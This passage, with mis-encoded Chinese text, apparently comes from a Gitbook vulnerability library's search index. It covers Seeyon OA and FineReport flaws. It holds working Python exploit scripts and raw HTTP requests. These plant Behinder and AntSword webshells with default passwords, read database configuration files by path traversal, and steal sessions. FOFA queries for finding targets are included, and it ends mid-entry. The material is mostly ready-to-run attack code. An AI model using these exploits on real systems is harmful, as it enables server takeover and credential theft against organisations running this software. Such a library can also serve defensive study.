%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00 ÂÜ∞Ëùé3 ÈªòËÆ§È©¨pass : rebeyond webshellÂú∞ÂùÄ: http://xxx.xxx.xxx.xxx/seeyon/apps_res/addressbook/images/config.jspx ÊàêÂäü‰ºöËøîÂõû { \"message\":null, \"details\":null, \"code\":\"0436821967\" } Â§±Ë¥•‰ºöËøîÂõû { \"message\": \"Ë¢´Ëø´‰∏ãÁ∫øÔºåÂéüÂõ†Ôºö‰∏éÊúçÂä°Âô®Â§±ÂéªËøûÊé•\", \"code\": \"-1\", \"details\": null } ‰∏ä‰º†ÂêéËØ∑Ê±ÇwebshellÂú∞ÂùÄÔºåËÆøÈóÆËøîÂõûÂá∫Áé∞Â¶Ç‰∏ãÂõæÂàôÊàêÂäüÂÜôÂÖ• [!NOTE] ËÆøÈóÆÁä∂ÊÄÅÁ†Å‰∏∫ 200 ÊàêÂäü ËÆøÈóÆÁä∂ÊÄÅÁ†Å‰∏∫ 404 Â§±Ë¥• ‰ΩøÁî®ÂÜ∞ËùéËøûÊé•:rebeyond ÊºèÊ¥ûÂà©Áî®POC [!NOTE] Âçï‰∏™ÁõÆÊ†á import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA Â§ö‰∏™ÁâàÊú¨ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_2 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print('\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç: {}'.format(vuln_url_2)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url_2, headers=headers, data=data, verify=False) test_webshell(target_url) def test_webshell(target_url): webshell_url = target_url + \"/seeyon/apps_res/addressbook/images/config.jspx\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç : {}/seeyon/apps_res/addressbook/images/config.jspx\\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º† webshell : {}/seeyon/apps_res/addressbook/images/config.jspx\\033[0m\".format(target_url,target_url)) print(\"\\033[32m[o] webshellÂú∞ÂùÄÔºö{}/seeyon/apps_res/addressbook/images/config.jspx \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂÜ∞Ëùé3ÈªòËÆ§È©¨ pass Ôºörebeyond \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÊó†Ê≥ïÂà©Áî®ÔºåÂÜôÂÖ•Â§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÊó†Ê≥ïÂà©Áî®ÔºåÂÜôÂÖ•Â§±Ë¥• {} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Êñá‰ª∂ÁºñÁ†ÅËÑöÊú¨, Ëá™Ë°åËøõË°åËá™ÂÆö‰πâË∞ÉËØï Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA webmail.do‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62422.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA webmail.do‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62422.html","title":"Ëá¥ËøúOA webmail.do‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62422","keywords":"","body":"Ëá¥ËøúOA webmail.do‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62422 ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOAÂ≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥û‰∏ãËΩΩ‰ªªÊÑèÊñá‰ª∂ÔºåËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA A6-V5 Ëá¥ËøúOA A8-V5 Ëá¥ËøúOA G6 ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ url http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties Â≠òÂú®ÊºèÊ¥ûÁöÑOA Á≥ªÁªüÂ∞Ü‰ºö‰∏ãËΩΩ datasourceCtp.properties ÈÖçÁΩÆÊñá‰ª∂ Êõ¥ÊîπÂèÇÊï∞ filePath ÂèØ‰∏ãËΩΩÂÖ∂‰ªñÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOAÂ§ö‰∏™ÁâàÊú¨ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"workflow\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á{}Â≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] Êñá‰ª∂ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Ëá¥ËøúOA webmail.do‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62422 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA SessionÊ≥ÑÈú≤ ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA SessionÊ≥ÑÈú≤ ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"Ëá¥ËøúOA SessionÊ≥ÑÈú≤ ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"Ëá¥ËøúOA SessionÊ≥ÑÈú≤ ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOAÈÄöËøáÂèëÈÄÅÁâπÊÆäËØ∑Ê±ÇËé∑ÂèñsessionÔºåÂú®ÈÄöËøáÊñá‰ª∂‰∏ä‰º†Êé•Âè£‰∏ä‰º†webshellÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA FOFA [!NOTE] title=\"Ëá¥Ëøú\" ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖàË¶ÅËé∑ÂèñÁÆ°ÁêÜÂëòcookie POST /seeyon/thirdpartyController.do HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 133 Content-Type: application/x-www-form-urlencoded method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1 [!NOTE] ËøîÂõûÂåÖÂá∫Áé∞ Sset-Cookie Âíå a8genius.do Âç≥‰∏∫ÊàêÂäüËé∑Âèñ ‰∏ä‰º†ÂéãÁº©ÂåÖÊ∑ªÂä† Cookie‰∏ä‰º† POST /seeyon/fileUpload.do?method=processUpload HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.25.1 Cookie: JSESSIONID=3495C4DEF87200EA323B1CA31E3B7DF5 Content-Length: 841 Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"firstSave\" true --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"callMethod\" resizeLayout --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"isEncrypt\" 0 --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"takeOver\" false --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"type\" 0 --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"file1\"; filename=\"test.png\" Content-Type: image/png PK....................______ --59229605f98b8cf290a7b8908b34616b-- ÁÑ∂ÂêéÊûÑÈÄ†ËØ∑Ê±ÇËß£ÂéãÂéãÁº©ÂåÖ POST /seeyon/ajax.do HTTP/1.1 Host: 192.168.10.2 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=BDF7358D4C35C6D2BB99FADFEE21F913 Content-Length: 157 method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%222021-04-09%22%2C%225818374431215601542%22%5D Áä∂ÊÄÅÁ†ÅËøîÂõû500Âç≥‰∏∫‰∏ä‰º†ÊàêÂäü ÊºèÊ¥ûPOC [!NOTE] ËÑöÊú¨Âú®Êñá‰ª∂ÁõÆÂΩïÁöÑ POC‰∏≠ ÂÖ∂‰∏≠Âê´ÊúâzipÂéãÁº©ÂåÖ shell.zip, Â¶ÇÊûú‰∏ä‰º†Â§±Ë¥•Êõ¥Êîπ‰∏Ä‰∏ãÊñá‰ª∂Âêç # coding: utf-8 import requests import sys import random import time import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/seeyon/thirdpartyController.do\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if response.status_code == 200 and \"a8genius.do\" in response.text and 'set-cookie' in str(response.headers).lower(): cookies = response.cookies cookies = requests.utils.dict_from_cookiejar(cookies) cookie = cookies['JSESSIONID'] targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload' print(\"\\033[32m[o] ÁõÆÊ†á {} Ê≠£Âú®‰∏ä‰º†ÂéãÁº©ÂåÖÊñá‰ª∂.... \\n[o] Cookie: {} \\033[0m\".format(target_url, cookie)) files = [('file1', ('360icon.png', open('shell.zip', 'rb'), 'image/png'))] headers = {'Cookie':\"JSESSIONID=%s\" % cookie} data = {'callMethod': 'resizeLayout', 'firstSave': \"true\", 'takeOver':\"false\", \"type\": '0','isEncrypt': \"0\"} response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False) reg = re.findall('fileurls=fileurls\\+\",\"\\+\\'(.+)\\'',response.text,re.I) if len(reg)==0: sys.exit(\"‰∏ä‰º†Êñá‰ª∂Â§±Ë¥•\") POC_2(target_url, cookie, reg, headers) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url),e) def POC_2(target_url, cookie, reg, headers): vuln_url = target_url + '/seeyon/ajax.do' datestr = time.strftime('%Y-%m-%d') post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + reg[0] + '%22%5D' headers['Content-Type']=\"application/x-www-form-urlencoded\" print(\"\\033[32m[o] ÁõÆÊ†á {} Ê≠£Âú®Ëß£ÂéãÊñá‰ª∂.... \\033[0m\".format(target_url)) try: response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False) if response.status_code == 500: print(\"\\033[32m[o] ÁõÆÊ†á {} Ëß£ÂéãÊñá‰ª∂ÊàêÂäü.... \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÈªòËÆ§WebshellÂú∞ÂùÄ: {}/seeyon/common/designer/pageLayout/test10086.jsp \\033[0m\".format(target_url)) print(\"\\033[32m[o] ËöÅÂâëÂØÜÁ†Å: test \\033[0m\".format(target_url)) print(\"\\033[32m[o] Â¶ÇÊûúÁõÆÊ†áwebshellÊó†Ê≥ïËÆøÈóÆÔºåËØ∑Êõ¥Êç¢ shell.zip ‰∏≠ÁöÑÊú®È©¨ÂêçÁß∞ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url),e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/","title":"Â∏ÜËΩØOA","keywords":"","body":"Â∏ÜËΩØÊä•Ë°® Â∏ÜËΩØÊä•Ë°® v8.0 ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2018-04757 Â∏ÜËΩØ V9 ‰ªªÊÑèÊñá‰ª∂Ë¶ÜÁõñÊñá‰ª∂‰∏ä‰º† Â∏ÜËΩØÊä•Ë°® 2012 SSRFÊºèÊ¥û Â∏ÜËΩØÊä•Ë°® 2012 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØÊä•Ë°® v8.0 ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2018-04757.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØÊä•Ë°® v8.0 ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2018-04757.html","title":"Â∏ÜËΩØÊä•Ë°® v8.0 ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2018-04757","keywords":"","body":"Â∏ÜËΩØÊä•Ë°® v8.0 ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2018-04757 ÊºèÊ¥ûÊèèËø∞ FineReportÊä•Ë°®ËΩØ‰ª∂ÊòØ‰∏ÄÊ¨æÁ∫ØJavaÁºñÂÜôÁöÑÔºåÈõÜÊï∞ÊçÆÂ±ïÁ§∫(Êä•Ë°®)ÂíåÊï∞ÊçÆÂΩïÂÖ•(Ë°®Âçï)ÂäüËÉΩ‰∫é‰∏ÄË∫´ÁöÑ‰ºÅ‰∏öÁ∫ßwebÊä•Ë°®Â∑•ÂÖ∑„ÄÇ FineReport v8.0ÁâàÊú¨Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ÊºèÊ¥ûËØªÂèñÁΩëÁ´ô‰ªªÊÑèÊñá‰ª∂„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] FineReport FOFA [!NOTE] body=\"isSupportForgetPwd\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ fr-applet-8.0.jar package com.fr.chart.web; import com.fr.base.FRContext; import com.fr.general.IOUtils; import com.fr.stable.CodeUtils; import com.fr.web.core.ActionNoSessionCMD; import com.fr.web.utils.WebUtils; import java.io.InputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ChartGetFileContentAction extends ActionNoSessionCMD { public ChartGetFileContentAction() { } public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception { String var4 = 